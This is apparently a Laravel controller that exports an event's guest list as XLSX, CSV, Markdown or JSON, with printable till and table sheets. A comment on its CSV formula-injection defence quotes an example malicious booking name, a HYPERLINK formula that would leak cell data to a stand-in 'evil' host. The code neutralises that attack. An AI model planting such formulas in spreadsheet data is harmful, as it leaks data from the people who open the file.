<?php

namespace App\Http\Controllers\Api;

use App\Exceptions\ApiError;
use App\Http\Controllers\Controller;
use App\Models\Event;
use App\Support\Emits;
use App\Support\GuestList;
use Dedoc\Scramble\Attributes\Endpoint;
use Dedoc\Scramble\Attributes\Group;
use Dedoc\Scramble\Attributes\Header;
use Dedoc\Scramble\Attributes\Response as DocumentedResponse;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Response;
use OpenSpout\Common\Entity\Row;
use OpenSpout\Common\Entity\Style\Border;
use OpenSpout\Common\Entity\Style\BorderName;
use OpenSpout\Common\Entity\Style\BorderPart;
use OpenSpout\Common\Entity\Style\BorderStyle;
use OpenSpout\Common\Entity\Style\BorderWidth;
use OpenSpout\Common\Entity\Style\Color;
use OpenSpout\Common\Entity\Style\Style;
use OpenSpout\Writer\Common\Entity\Sheet;
use OpenSpout\Writer\XLSX\Options;
use OpenSpout\Writer\XLSX\Options\HeaderFooter;
use OpenSpout\Writer\XLSX\Options\PageOrientation;
use OpenSpout\Writer\XLSX\Options\PageSetup;
use OpenSpout\Writer\XLSX\Options\PaperSize;
use OpenSpout\Writer\XLSX\Writer;
use Symfony\Component\HttpFoundation\StreamedResponse;

#[Group('Registration', weight: 40)]
class GuestListExportController extends Controller
{
    /**
     * Download the guest list as a file.
     *
     * Requires `registrations.view`. `{format}` is `xlsx`, `csv`, `md` or
     * `json`; any other value is a `404` from the router.
     *
     * Returns the list as an attachment named after the event: one row per
     * booking with the guest's details, a column for each of the event's
     * bookable options holding how many of it that booking took, the number
     * of people it covers, its total in francs and when it was made, then a
     * closing totals row for the caterer. Every format carries the same rows
     * in the same order.
     *
     * The XLSX holds that list on its first sheet, `Inscriptions`, and two
     * more, set up to print on A4 landscape. `Caisse` is the till: one row per
     * booking in name order, with the table, the quantities under their unit
     * prices, the total, and two blank columns to fill in by hand at the door,
     * unless the booking is already marked paid. `Tables`, present when the
     * form asks for a table or a booking has one, groups the bookings by table
     * with each table's sums and the answers to the form's questions, and no
     * prices.
     *
     * The CSV is semicolon-separated and carries a UTF-8 byte order mark, so
     * Excel opens it in columns and with accents intact.
     *
     * XLSX needs the PHP `zip` extension. A server without it answers
     * `503 xlsx_unavailable`, and CSV still works there.
     */
    // Aliased, because this controller already imports Symfony's Response as
    // its return type.
    #[DocumentedResponse(200, 'The guest list in the requested format. Same rows every time; only the encoding differs.')]
    #[Header('Content-Disposition', 'attachment, with a filename built from the event. Browsers save rather than render.', type: 'string')]
    #[Endpoint(operationId: 'registration.export')]
    #[Emits('xlsx_unavailable')]
    public function __invoke(Event $event, string $format): Response|StreamedResponse|JsonResponse
    {
        // One row builder (App\Support\GuestList), four formatters, so the
        // formats cannot disagree about the contents; a test asserts it.
        //
        // XLSX is the one a committee member opens in Excel. CSV is the
        // dependency-free fallback: openspout needs ext-zip, which is
        // unverified on the shared host, and without it this endpoint says so
        // instead of dying with "Class ZipArchive not found".
        //
        // Markdown is for pasting into notes or a message; JSON offers the
        // screen's rows as a file.
        $list = GuestList::for($event);

        return match ($format) {
            'xlsx' => $this->xlsx($list),
            'csv' => $this->csv($list),
            'md' => $this->markdown($list),
            'json' => $this->json($list),
            // Unreachable through the constrained route; kept so a widened
            // constraint cannot fall through to a 500.
            default => ApiError::json(404, 'not_found', 'Unknown export format'),
        };
    }

    private function xlsx(GuestList $list): JsonResponse|StreamedResponse
    {
        // A named refusal rather than a fatal, so an operator knows what to
        // ask the host for.
        if (! extension_loaded('zip')) {
            return ApiError::json(
                503,
                'xlsx_unavailable',
                'XLSX export needs the PHP zip extension, which this server does not have. Use CSV.',
            );
        }

        return response()->streamDownload(function () use ($list): void {
            $writer = new Writer(self::printOptions($list->title()));
            $writer->openToFile('php://output');

            $writer->getCurrentSheet()->setName('Inscriptions');
            $writer->addRow(Row::fromValues($list->headers()));
            foreach ($list->rows() as $row) {
                $writer->addRow(Row::fromValues($row));
            }
            $writer->addRow(Row::fromValues($list->totals()));

            $till = $list->till();
            $sheet = $writer->addNewSheetAndMakeItCurrent();
            $sheet->setName('Caisse');
            self::lay($sheet, count($till['headers']));
            $writer->addRow(Row::fromValuesWithStyle($till['headers'], self::cell(bold: true)));
            foreach ($till['rows'] as $row) {
                $writer->addRow(Row::fromValuesWithStyle($row, self::cell()));
            }
            $writer->addRow(Row::fromValuesWithStyle($till['totals'], self::cell(bold: true)));

            if ($list->hasTables()) {
                $plan = $list->tablePlan();
                $sheet = $writer->addNewSheetAndMakeItCurrent();
                // No space in the name: openspout writes it unquoted into the
                // print-titles formula, and Excel repairs a workbook whose
                // formula names "Plan de table" that way.
                $sheet->setName('Tables');
                self::lay($sheet, count($plan['headers']));
                $writer->addRow(Row::fromValuesWithStyle($plan['headers'], self::cell(bold: true)));
                foreach ($plan['blocks'] as $block) {
                    $writer->addRow(Row::fromValuesWithStyle($block['summary'], self::cell(bold: true, shaded: true)));
                    foreach ($block['rows'] as $row) {
                        $writer->addRow(Row::fromValuesWithStyle($row, self::cell()));
                    }
                }
            }

            $writer->close();
        }, $list->filename().'.xlsx', [
            'Content-Type' => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        ]);
    }

    /**
     * A4 landscape, as wide as one page and as long as it takes, with the
     * event's title and the print date at the top of every page: the
     * committee prints the till and the tables from desktop Excel.
     */
    private static function printOptions(string $title): Options
    {
        // fitToHeight 0 means "any number of pages". Left out, OOXML reads it
        // as 1 and shrinks a hundred bookings onto one page.
        return new Options(
            pageSetup: new PageSetup(PageOrientation::LANDSCAPE, PaperSize::A4, fitToHeight: 0, fitToWidth: 1),
            // & opens a control code in an Excel header, so a literal one is
            // doubled. openspout writes the header into the XML as given, so
            // it is escaped here.
            headerFooter: new HeaderFooter(
                oddHeader: htmlspecialchars('&L'.str_replace('&', '&&', $title).'&R&D', ENT_XML1),
            ),
        );
    }

    /**
     * Column widths for a printed sheet, and the header row on every page.
     */
    private static function lay(Sheet $sheet, int $columns): void
    {
        $sheet->setPrintTitleRows('$1:$1');
        $sheet->setColumnWidth(22, 1);
        if ($columns > 1) {
            $sheet->setColumnWidthForRange(14, 2, $columns);
        }
    }

    /**
     * A bordered cell. openspout cannot set "print gridlines", so borders
     * draw the grid a volunteer writes into.
     *
     * Wrapped, because every cell's neighbour is filled: an unwrapped
     * "Menu viande (45.–)" is cut off at the column edge, price first, and so
     * is a long answer the kitchen needs to read.
     */
    private static function cell(bool $bold = false, bool $shaded = false): Style
    {
        $line = fn (BorderName $side): BorderPart => new BorderPart($side, Color::BLACK, BorderWidth::THIN, BorderStyle::SOLID);
        $style = (new Style)
            ->withBorder(new Border(
                $line(BorderName::TOP),
                $line(BorderName::BOTTOM),
                $line(BorderName::LEFT),
                $line(BorderName::RIGHT),
            ))
            ->withFontBold($bold)
            ->withShouldWrapText(true);

        return $shaded ? $style->withBackgroundColor('EEEEEE') : $style;
    }

    private function csv(GuestList $list): Response
    {
        $handle = fopen('php://temp', 'r+');

        // A UTF-8 BOM: Excel on Windows reads a BOM-less UTF-8 CSV in the
        // system codepage, so "Répétition" would show as "RÃ©pÃ©tition".
        fwrite($handle, "\xEF\xBB\xBF");

        // Semicolons, not commas: Swiss and French Excel treat ';' as the
        // field separator, and a comma-delimited file opens as one column.
        fputcsv($handle, $list->headers(), ';');
        foreach ($list->rows() as $row) {
            fputcsv($handle, array_map(self::defuse(...), $row), ';');
        }
        fputcsv($handle, array_map(self::defuse(...), $list->totals()), ';');

        rewind($handle);
        $csv = (string) stream_get_contents($handle);
        fclose($handle);

        return response($csv, 200, [
            'Content-Type' => 'text/csv; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.csv"',
        ]);
    }

    /**
     * Stops Excel executing a guest's name.
     *
     * Every identity column comes from the public booking form and is
     * validated only as a string, so a booking under the name
     * =HYPERLINK("https://evil/"&A1,"cliquez") is a live formula once a
     * committee member opens the CSV. A leading apostrophe makes Excel treat
     * the cell as text and is not displayed.
     *
     * CSV only. The XLSX writer emits typed string cells that Excel does not
     * re-parse, and nothing executes Markdown. Applied elsewhere, it would put
     * stray apostrophes in the other formats and break their agreement.
     */
    private static function defuse(mixed $cell): mixed
    {
        if (! is_string($cell) || $cell === '') {
            return $cell;
        }

        return str_contains("=+-@\t\r", $cell[0]) ? "'".$cell : $cell;
    }

    private function markdown(GuestList $list): Response
    {
        $line = fn (array $cells): string => '| '.implode(' | ', array_map(
            fn ($cell): string => str_replace('|', '\\|', (string) ($cell ?? '')),
            $cells
        )).' |';

        $lines = [$line($list->headers())];
        $lines[] = '| '.implode(' | ', array_fill(0, count($list->headers()), '---')).' |';

        foreach ($list->rows() as $row) {
            $lines[] = $line($row);
        }
        $lines[] = $line($list->totals());

        return response(implode("\n", $lines)."\n", 200, [
            'Content-Type' => 'text/markdown; charset=UTF-8',
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.md"',
        ]);
    }

    private function json(GuestList $list): JsonResponse
    {
        return response()->json([
            'headers' => $list->headers(),
            'rows' => $list->rows(),
            'totals' => $list->totals(),
        ], 200, [
            'Content-Disposition' => 'attachment; filename="'.$list->filename().'.json"',
        ]);
    }
}
